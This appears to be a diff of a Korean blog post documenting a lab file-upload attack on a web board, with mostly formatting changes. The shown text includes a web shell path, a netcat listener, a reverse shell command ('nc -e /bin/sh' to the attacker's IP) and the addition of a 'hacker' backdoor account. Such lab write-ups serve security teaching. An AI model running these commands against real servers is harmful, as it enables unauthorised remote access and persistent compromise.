@@ -75,7 +75,7 @@ http://10.10.10.10/wizboard/table/root/board04/updir/shell.php.kr
 
 > 3.4. 계정 확인 (명령어 : id)
 
-**`nobody` 계정은 가장 권한이 낮은 계정 중 하나로, apache web server process를 구동시키기 위한 계정이다.**
+**nobody 계정은 가장 권한이 낮은 계정 중 하나로, apache web server process를 구동시키기 위한 계정이다.**
 
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.4.png"></p></center>
 
@@ -107,8 +107,8 @@ http://10.10.10.10/wizboard/table/root/board04/updir/shell.php.kr
 
 
 <div class="notice">
-※ Expolit code 를 실행하였음에도, 권한상승에 실패한 이유?
-
+※ Expolit code 를 실행하였음에도, 권한상승에 실패한 이유?<br>
+<br>
 웹쉘이란?  사실은 쉘이 아니다. 리눅스 쉘에 명령어를 전달하고 출력결과를 전달해주는 것으로 리눅스에서 쉘은 /bin/bash, /bin/sh 등이다. 실제 shell 을 통해 exploit 코드를 실행하여야 한다.
 </div>
 
@@ -118,15 +118,18 @@ http://10.10.10.10/wizboard/table/root/board04/updir/shell.php.kr
 > 4.1. 공격 대상 PC 에서 nc 프로그램을 연결대기 상태로 만든다.
 
 cmd 창을 2개 생성 후 다음과 같이 명령어를 입력한다.<br>
-`cmd_1` : nc -l -p 31337, 31337 포트를 이용한 프로그램 실행 중 상태 (31337 포트는 임의로 선택한 것이다.)<br>
-`cmd_2` : netstat -an, 31337 포트가 리스팅 상태인지(프로그램이 제대로 실행되었는지) 확인
+- `cmd_1` : nc -l -p 31337<br>
+31337 포트를 이용한 프로그램 실행 중 상태 (31337 포트는 임의로 선택한 것이다.)<br>
+- `cmd_2` : netstat -an<br>
+31337 포트가 리스팅 상태인지(프로그램이 제대로 실행되었는지) 확인
 
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/4.1.jpg"></p></center>
 
 > 4.2. 웹쉘을 통해 서버 -> 공격대상 PC 연결시킨다.
 
-`웹쉘` : nc -e /bin/sh 10.10.10.1 31337 (이때, 10.10.10.1 은 공격자의 IP 주소이다.)<br>
-`cmd_1` : id (연결확인)
+-`웹쉘` : nc -e /bin/sh 10.10.10.1 31337<br>
+(이때, 10.10.10.1 은 공격자의 IP 주소이다.)<br>
+- `cmd_1` : id (연결확인)
 
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/4.2.png"></p></center>
 
@@ -142,11 +145,9 @@ cmd 창을 2개 생성 후 다음과 같이 명령어를 입력한다.<br>
 
 > 5.2. hacker 계정 추가
 
-```
 useradd hacker<br>
 passwd hacker<br>
 cat /etc/passwd (hacker 계정 추가 확인)
-```
 
 <center><p><img src="/assets/2019-01-28-post-file_upload_attack/5.2.png"></p></center>
 
